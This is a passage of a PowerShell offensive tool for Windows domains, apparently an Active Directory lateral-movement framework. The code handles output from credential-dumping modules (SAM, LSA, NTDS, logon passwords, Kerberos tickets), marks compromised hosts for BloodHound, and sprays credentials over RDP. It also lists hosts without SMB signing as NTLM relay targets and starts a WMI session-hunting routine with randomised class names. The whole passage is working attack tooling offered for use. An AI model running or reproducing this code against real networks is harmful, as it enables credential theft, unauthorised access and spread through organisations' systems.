                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NO RESULTS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "RunAsPPL Disabled") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "RunAsPPL Enabled") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "Successful Connection PME") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        Continue
                    }
                    
                    elseif ($result -eq "Unable to connect") {}
                    
                    elseif ($result -match "[a-zA-Z0-9]") {
                        if ($result -eq "No Results") {
                            if ($successOnly) { continue }
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Yellow" `
                                -statusSymbol "[*] " `
                                -statusText "NO RESULTS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            Continue
                        }
                        else {
                            $Global:SuccessCount++
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Green" `
                                -statusSymbol "[+] " `
                                -statusText "SUCCESS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -ComputerOwned
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -UserName $Username `
                                -AdminToProperty

                            $filePath = switch ($Module) {
                                "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                "LSA" { "$LSADump\$($runspace.ComputerName)-LSA.txt" }
                                "LSA-Trust" { "$LSATrust\$($runspace.ComputerName)-Trust.txt" }
                                "MDF" { "$MDF\$($runspace.ComputerName)-MDF.txt" }
                                "NTDS" { "$DCSyncFullDump\$($runspace.ComputerName)-NTDS.txt" }
                                "NTLM" { "$NTLM\$($runspace.ComputerName)-NTLM.txt" }
                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                "SessionExec" { "$SessionExec\$($runspace.ComputerName)-SessionExec.txt" }
                                "SessionRelay" { "$SessionRelay\$($runspace.ComputerName)-SessionRelay.txt" }
                                "SSH" { "$SSH\$($runspace.ComputerName)-SSH.txt" }
                                "TGTDeleg" { "$TGTDeleg\$($runspace.ComputerName)-TGTDeleg.txt" }
                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
                                "Wifi" { "$Wifi\$($runspace.ComputerName)-Wifi.txt" }
                                "WinSCP" { "$WinSCP\$($runspace.ComputerName)-WinSCP.txt" }
                                default { $null }
                            }

                            if ($filePath) {
                                $result | Out-File -FilePath $filePath -Encoding "ASCII"

                                if ($ShowOutput) {
                                    $result | Write-Output
                                    Write-Output ""
                                    $hasDisplayedResult = $true
                                }
                            }

                            # Handle the default case.
                            if (-not $Module -and -not $hasDisplayedResult) {
                                $result | Write-Output
                                Write-Output ""
                                $hasDisplayedResult = $true
                            }
                        }
                    }
                    elseif ($result -notmatch "[a-zA-Z0-9]") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        Continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })


        $runspacePool.Close()
        $runspacePool.Dispose()

    }

    ################################################################################################################
    ################################################# Function: RDP ################################################
    ################################################################################################################
   
    Function Method-RDP {
        $ErrorActionPreference = "SilentlyContinue"
        Write-Host

        $MaxConcurrentJobs = $Threads
        $RDPJobs = @()

        # Setting up runspaces for Port Checking
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, 4) # Need to test the threads at scale more
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $RunSpaceScriptBlock = {
            param ($computerName, $Timeout)
    
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 3389, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if ($connected) { return "Connected" }
            else { return "Unable to connect" }
        }

        foreach ($computer in [array]$Computers) {
    
            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = $Computer
                $OS = "OS:PLACEHOLDER"
            }
    
            $runspace = [powershell]::Create().AddScript($RunSpaceScriptBlock).AddArgument($ComputerName).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        $FailedComputers = @()

        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                    if ($result -eq "Unable to connect") {
                        $FailedComputers += $runspace.ComputerName
                        continue
                    }
           
                    # Cleanup for completed runspaces
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        # Final cleanup
        $runspacePool.Close()
        $runspacePool.Dispose()

        foreach ($Computer in [array]$Computers) {
    
            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }

            # Check if the computer is in the FailedComputers list
            if ($ComputerName -in $FailedComputers) { continue }

            $ScriptBlock = {

                Param($OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly, $Global:irdp, $IPAddress, $RDP, $BloodHound)
                Invoke-Expression -Command $Global:irdp

                function Resolve-DnsNameWithTimeout {
                    param(
                        [string]$IPAddress,
                        [int]$Timeout
                    )
                    try {
                        $timeoutTask = [timespan]::FromMilliseconds($Timeout)
                        $task = [System.Net.Dns]::GetHostEntryAsync($IPAddress)

                        $sw = [System.Diagnostics.Stopwatch]::StartNew()

                        if ($task.Wait($timeoutTask)) {
                            $sw.Stop() # Stop the stopwatch
                            Write-Host ("{0,-44}" -f $($task.Result.HostName)) -NoNewline
                        }
                        else {
                            $sw.Stop()
                            Write-Host ("{0,-44}" -f "") -NoNewline
                        }
                    }
                    catch {
                        Write-Host ("{0,-44}" -f "") -NoNewline
                    } 
                }

                function Display-ComputerStatus {
                    param (
                        [string]$ComputerName,
                        [string]$OS,
                        [System.ConsoleColor]$statusColor = 'White',
                        [string]$statusSymbol = "",
                        [string]$statusText = "",
                        [int]$NameLength,
                        [int]$OSLength
                    )

                    # Prefix
                    Write-Host "RDP " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "   " -NoNewline
     
                    if (!$IPAddress) {
                        # Resolve IP
                        $IP = $null
                        $Ping = New-Object System.Net.NetworkInformation.Ping
                        $Result = $Ping.Send($ComputerName, 15)
                        if ($Result.Status -eq 'Success') {
                            $IP = $Result.Address.IPAddressToString
                            Write-Host ("{0,-16}" -f $IP) -NoNewline
                        }
                        else {
                            Write-Host ("{0,-16}" -f $IP) -NoNewline
                        }
                    }
                    elseif ($IPAddress) {
                        Resolve-DnsNameWithTimeout -IPAddress $ComputerName -Timeout 5000
                    }

                    # IP Address in use, display nothing in column
                    else {}

                    # Display ComputerName and OS
                    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
                    Write-Host "   " -NoNewline
                    if (!$IPAddress) { Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline }
                    Write-Host "   " -NoNewline

                    # Display status symbol and text
                    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
                    Write-Host $statusText
                }

                function Append-BHQueryRDP {
                    param(
                        [Parameter(Mandatory = $true)]
                        [string]$ComputerName,
                        [Parameter(Mandatory = $true)]
                        [string]$Username,
                        [Parameter(Mandatory = $true)]
                        [string]$Domain
                    )

                    if ($LocalAuth) { return }

                    try {
                        $Domain = $Domain.ToUpper()
                        $ComputerName = $ComputerName.Split('.')[0].ToUpper()
                        $Username = $Username.ToUpper()
                        $filePath = "$BloodHound\Query.txt"

                        $fileContent = if (Test-Path -Path $filePath) { Get-Content -Path $filePath -Raw } else { "" }


                        Set-Content -Path $filePath -Value $initialContent

                        $RDPEntry = "{rdpusername: ""$Username@$Domain"", rdpcomputername: ""$ComputerName.$Domain""}"
                        if (-not $fileContent.Contains($RDPEntry)) {
                            $fileContent = $fileContent -replace "(?<=FOREACH \(RDPitem IN \[)(.*)(?=\] \|)", "`$1, $RDPEntry"
                            Set-Content -Path $filePath -Value $fileContent
                        }

                    }
                    catch {}
                }



                [int]$Global:SuccessCount = 0
                if ($LocalAuth) { $Domain = $ComputerName }
                if ($Password -ne "") { $result = Invoke-RDP "username=$Domain\$Username password=$Password computername=$ComputerName" }
           
                try { $result = $result.Trim() } catch {}

                $SuccessStatus = @(
                    'Success',
                    'STATUS_PASSWORD_MUST_CHANGE',
                    'LOGON_FAILED_UPDATE_PASSWORD',
                    'ARBITRATION_CODE_BUMP_OPTIONS',
                    'ARBITRATION_CODE_CONTINUE_LOGON',
                    'ARBITRATION_CODE_CONTINUE_TERMINATE',
                    'ARBITRATION_CODE_NOPERM_DIALOG',
                    'ARBITRATION_CODE_REFUSED_DIALOG',
                    'ARBITRATION_CODE_RECONN_OPTIONS'
                )

                $DeniedStatus = @(
                    'ERROR_CODE_ACCESS_DENIED',
                    'LOGON_FAILED_BAD_PASSWORD',
                    'LOGON_FAILED_OTHER',
                    'LOGON_WARNING',
                    'STATUS_LOGON_FAILURE',
                    'SSL_ERR_LOGON_FAILURE',
                    'disconnectReasonByServer',
                    'disconnectReasonRemoteByUser'
                )

                $PwChangeStatus = @('SSL_ERR_PASSWORD_MUST_CHANGE')
                $ToDStatus = @('STATUS_ACCOUNT_RESTRICTION')

                switch ($result) {
                    "Unable to connect" {
                        continue
                    }
                    { $SuccessStatus -contains $_ } {
                        $SuccessCount++
                        Display-ComputerStatus -ComputerName $ComputerName `
                            -OS $OS `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength

                        if ($LocalAuth) {
                            $Username = "$Username (Local Account)"
                        }
                        if (-not (Test-Path -Path "$RDP\$Username.txt")) {
                            New-Item -Path "$RDP\$Username.txt" -ItemType "File" -Force | Out-Null
                        }
                        $ComputerName | Out-File -FilePath "$RDP\$Username.txt" -Encoding ASCII -Append
                        Append-BHQueryRDP -ComputerName $ComputerName -Username $Username -Domain $Domain
                        continue
                    }
                    { $DeniedStatus -contains $_ } {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus -ComputerName $ComputerName `
                            -OS $OS `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ACCESS DENIED" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    { $PwChangeStatus -contains $_ } {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus -ComputerName $ComputerName `
                            -OS $OS `
                            -statusColor "Magenta" `
                            -statusSymbol "[/] " `
                            -statusText "PASSWORD CHANGE REQUIRED" `
                            -NameLength $NameLength `
                            -OSLength $OSLength

                        if ($LocalAuth) {
                            $Username = "$Username (Local Account)"
                        }
                        if (-not (Test-Path -Path "$RDP\$Username.txt")) {
                            New-Item -Path "$RDP\$Username.txt" -ItemType "File" -Force | Out-Null
                        }
        ($ComputerName + "(Password Change Required)") | Out-File -FilePath "$RDP\$Username.txt" -Encoding ASCII -Append
                        Append-BHQueryRDP -ComputerName $ComputerName -Username $Username -Domain $Domain
                        continue
                    }
                    { $ToDStatus -contains $_ } {
                        $SuccessCount++
                        Display-ComputerStatus -ComputerName $ComputerName `
                            -OS $OS `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS - ACCOUNT RESTRICTION" `
                            -NameLength $NameLength `
                            -OSLength $OSLength

                        if ($LocalAuth) {
                            $Username = "$Username (Local Account)"
                        }
                        if (-not (Test-Path -Path "$RDP\$Username.txt")) {
                            New-Item -Path "$RDP\$Username.txt" -ItemType "File" -Force | Out-Null
                        }
        ($ComputerName + "(Account Restriction)") | Out-File -FilePath "$RDP\$Username.txt" -Encoding ASCII -Append
                        Append-BHQueryRDP -ComputerName $ComputerName -Username $Username -Domain $Domain
                        continue
                    }
                    default {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus -ComputerName $ComputerName `
                            -OS $OS `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "$_" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                }

   

            }

            while (($RDPJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxConcurrentJobs) {
                Start-Sleep -Milliseconds 100
            }

            # Start the job
            $RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly, $Global:irdp, $IPAddress, $RDP, $BloodHound
            [array]$RDPJobs += $RDPJob
        }

        # Monitor and manage jobs, terminate any that run longer than 120 seconds (Assume hung)
        do {
            foreach ($Job in $RDPJobs) {
                if ($Job.State -eq 'Running') {
                    $runtime = (Get-Date) - $Job.PSBeginTime
                    if ($runtime.TotalSeconds -gt 120) {
                        Stop-Job -Job $Job -Force
                        Remove-Job -Job $Job -Force
                        $RDPJobs = $RDPJobs | Where-Object { $_.Id -ne $Job.Id }
                    }
                }
                elseif ($Job.State -eq 'Completed') {
                    $Result = Receive-Job -Job $Job
                    $Result
                    Remove-Job -Job $Job -Force
                    $RDPJobs = $RDPJobs | Where-Object { $_.Id -ne $Job.Id }
                }
            }
            Start-Sleep -Milliseconds 100
        } while ($RDPJobs.Count -gt 0)

        # Final cleanup for any lingering jobs (should be none at this point)
        $RDPJobs | Remove-Job -Force -ErrorAction SilentlyContinue

        if (Test-Path -Path "$RDP\$Username.txt") {
            Get-Content -Path "$RDP\$Username.txt" | Select-Object -Unique | Set-Content -Path "$RDP\$Username.txt"
        }
    }

    ################################################################################################################
    ############################################# Function: GenRelayList ###########################################
    ################################################################################################################

    Function GenRelayList {
        Write-output ""

        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Command, $Timeout)

            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            if (!$connected) { return "Unable to connect" ; $tcpClient.Close() }   

            # Code is a revision from: https://github.com/tmenochet/PowerScan/blob/master/Recon/Get-SmbStatus.ps1
            Function Get-SMBSigning {
                Param ([string]$ComputerName, $Timeout)

                $SMB1 = Get-SmbVersionStatus -ComputerName $ComputerName -SmbVersion 'SMB1' -Timeout $Timeout
                $SMB2 = Get-SmbVersionStatus -ComputerName $ComputerName -SmbVersion 'SMB2' -Timeout $Timeout

                if ($SMB1.SigningStatus -or $SMB2.SigningStatus) { "Signing Required" } else { "Signing not Required" }
            }

            function ConvertFrom-PacketOrderedDictionary ($packet_ordered_dictionary) {
                $byte_array = @()
                foreach ($field in $packet_ordered_dictionary.Values) {
                    $byte_array += $field
                }
                return $byte_array
            }

            function Get-PacketNetBIOSSessionService {
                Param (
                    [Int] $packet_header_length,
                    [Int] $packet_data_length
                )

                [Byte[]] $packet_netbios_session_service_length = [BitConverter]::GetBytes($packet_header_length + $packet_data_length)
                $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]
                $packet_NetBIOSSessionService = New-Object Collections.Specialized.OrderedDictionary
                $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Message_Type", [Byte[]](0x00))
                $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Length", $packet_netbios_session_service_length)
                return $packet_NetBIOSSessionService
            }

            function Get-PacketSMBHeader {
                Param (
                    [Byte[]] $packet_command,
                    [Byte[]] $packet_flags,
                    [Byte[]] $packet_flags2,
                    [Byte[]] $packet_tree_ID,
                    [Byte[]] $packet_process_ID,
                    [Byte[]] $packet_user_ID
                )

                $packet_SMBHeader = New-Object Collections.Specialized.OrderedDictionary
                $packet_SMBHeader.Add("SMBHeader_Protocol", [Byte[]](0xff, 0x53, 0x4d, 0x42))
                $packet_SMBHeader.Add("SMBHeader_Command", $packet_command)
                $packet_SMBHeader.Add("SMBHeader_ErrorClass", [Byte[]](0x00))
                $packet_SMBHeader.Add("SMBHeader_Reserved", [Byte[]](0x00))
                $packet_SMBHeader.Add("SMBHeader_ErrorCode", [Byte[]](0x00, 0x00))
                $packet_SMBHeader.Add("SMBHeader_Flags", $packet_flags)
                $packet_SMBHeader.Add("SMBHeader_Flags2", $packet_flags2)
                $packet_SMBHeader.Add("SMBHeader_ProcessIDHigh", [Byte[]](0x00, 0x00))
                $packet_SMBHeader.Add("SMBHeader_Signature", [Byte[]](0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00))
                $packet_SMBHeader.Add("SMBHeader_Reserved2", [Byte[]](0x00, 0x00))
                $packet_SMBHeader.Add("SMBHeader_TreeID", $packet_tree_ID)
                $packet_SMBHeader.Add("SMBHeader_ProcessID", $packet_process_ID)
                $packet_SMBHeader.Add("SMBHeader_UserID", $packet_user_ID)
                $packet_SMBHeader.Add("SMBHeader_MultiplexID", [Byte[]](0x00, 0x00))
                return $packet_SMBHeader
            }

            function Get-PacketSMBNegotiateProtocolRequest ($packet_version) {
                if ($packet_version -eq 'SMB1') {
                    [Byte[]] $packet_byte_count = 0x0c, 0x00
                }
                else {
                    [Byte[]] $packet_byte_count = 0x22, 0x00
                }
                $packet_SMBNegotiateProtocolRequest = New-Object Collections.Specialized.OrderedDictionary
                $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_WordCount", [Byte[]](0x00))
                $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_ByteCount", $packet_byte_count)
                $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat", [Byte[]](0x02))
                $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name", [Byte[]](0x4e, 0x54, 0x20, 0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32, 0x00))
                if ($packet_version -ne 'SMB1') {
                    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat2", [Byte[]](0x02))
                    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name2", [Byte[]](0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x30, 0x30, 0x32, 0x00))
                    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat3", [Byte[]](0x02))
                    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name3", [Byte[]](0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x3f, 0x3f, 0x3f, 0x00))
                }
                return $packet_SMBNegotiateProtocolRequest
            }

            function Get-SmbVersionStatus {
                Param (
                    [string] $ComputerName,
                    [string] $SmbVersion = 'SMB2',
                    $Timeout
                )

                #$serviceStatus = $false
                #$versionStatus = $false
                $signingStatus = $false

                $process_ID = [Diagnostics.Process]::GetCurrentProcess() | Select-Object -ExpandProperty Id
                $process_ID = [BitConverter]::ToString([BitConverter]::GetBytes($process_ID))
                $process_ID = $process_ID.Replace("-00-00", "")
                [Byte[]] $process_ID_bytes = $process_ID.Split("-") | ForEach-Object { [Char][Convert]::ToInt16($_, 16) }

                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $tcpClient.ReceiveTimeout = $Timeout

                try {
                    $tcpClient.Connect($ComputerName, "445")
                    if ($tcpClient.connected) {
                        $serviceStatus = $true

                        $SMB_relay_challenge_stream = $tcpClient.GetStream()
                        $SMB_client_receive = New-Object Byte[] 1024
                        $SMB_client_stage = 'NegotiateSMB'

                        while ($SMB_client_stage -ne 'exit') {
                            switch ($SMB_client_stage) {
                                'NegotiateSMB' {
                                    $packet_SMB_header = Get-PacketSMBHeader 0x72 0x18 0x01, 0x48 0xff, 0xff $process_ID_bytes 0x00, 0x00
                                    $packet_SMB_data = Get-PacketSMBNegotiateProtocolRequest $SmbVersion
                                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                                    $SMB_relay_challenge_stream.Write($SMB_client_send, 0, $SMB_client_send.Length) > $null
                                    $SMB_relay_challenge_stream.Flush()
                                    $SMB_relay_challenge_stream.Read($SMB_client_receive, 0, $SMB_client_receive.Length) > $null
                                    if ([BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42') {
                                        $SmbVersion = 'SMB1'
                                        $SMB_client_stage = 'NTLMSSPNegotiate'
                                    }
                                    else {
                                        $SMB_client_stage = 'NegotiateSMB2'
                                    }
                                    if (($SmbVersion -eq 'SMB1' -and [BitConverter]::ToString($SMB_client_receive[39]) -eq '0f') -or ($SmbVersion -ne 'SMB1' -and [BitConverter]::ToString($SMB_client_receive[70]) -eq '03')) {
                                        $signingStatus = $true
                                    }
                                    $tcpClient.Close()
                                    $SMB_client_receive = $null
                                    $SMB_client_stage = 'exit'
                                    #$versionStatus = $true
                                }
                            }
                        }
                    }
                }
    
                catch { return "Unable to connect" }
                finally { $tcpClient.Close() }
                return ([PSCustomObject]@{SigningStatus = $signingStatus })
            }

            return Get-SMBSigning -ComputerName $ComputerName

        }

        # Create and invoke runspaces for each computer
        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }
    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        [int]$Global:SuccessCount = 0
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $hasDisplayedResult = $false

                    try {
                        $result = $result.Trim()
                    }
                    catch {}

                    if ($Result -eq "Unable to connect") {
                        $runspace.Runspace.Dispose()
                        $runspace.Handle.AsyncWaitHandle.Close()
                        continue
                    }

                    if ($result -match "Signing Required") {
                        if ($SuccessOnly) {
                            continue
                        }
                        else {
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Red" `
                                -statusSymbol "[-] " `
                                -statusText "SMB Signing Required" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            continue
                        }
                    }
                    elseif ($result -match "Signing not Required") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SMB Signing not Required" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        $($runspace.ComputerName) | Out-File "$SMB\SigningNotRequired-$Domain.txt" `
                            -Encoding "ASCII" `
                            -Append `
                            -Force `
                            -ErrorAction "SilentlyContinue"
                        continue
                    }
                    else {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "ERROR" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }
            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })


        # Check if the file exists
        if (Test-Path "$SMB\SigningNotRequired-$Domain.txt") {
            $Unique = Get-Content "$SMB\SigningNotRequired-$Domain.txt" | Sort-Object -Unique
            $Unique | Set-Content "$SMB\SigningNotRequired-$Domain.txt" -Force
        } 

        $runspacePool.Close()
        $runspacePool.Dispose()
 
    }

    ################################################################################################################
    ############################################ Function: SessionHunter ###########################################
    ################################################################################################################
    Function Method-SessionHunter {
        Write-host

        Remove-Item -Path "$Sessions\SH-MatchedGroups-$Domain.txt" -Force -ErrorAction "SilentlyContinue"

        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Command, $Timeout)

            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if (!$connected) { return }
    
            $osInfo = $null
            $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue"
            if (!$osInfo) { return }

            Function WMI {
                param (
                    [string]$ComputerName,
                    [string]$Command,
                    [string]$Class = "Win32_" + -join ((65..90 + 97..122 + 48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ }),
                    [switch]$LocalAuth,
                    [string]$Username,
                    [string]$Password
                )

                # Create PSCredential object if using local authentication
                if ($LocalAuth) {
                    $LocalUsername = "$ComputerName\$Username"
                    $LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
                    $cred = New-Object System.Management.Automation.PSCredential($LocalUsername, $LocalPassword)
                }

                $WMIAccess = $null
                if ($LocalAuth) { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" -Credential $cred } 
                else { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" }

                if (!$WMIAccess) { return "Access Denied" } 
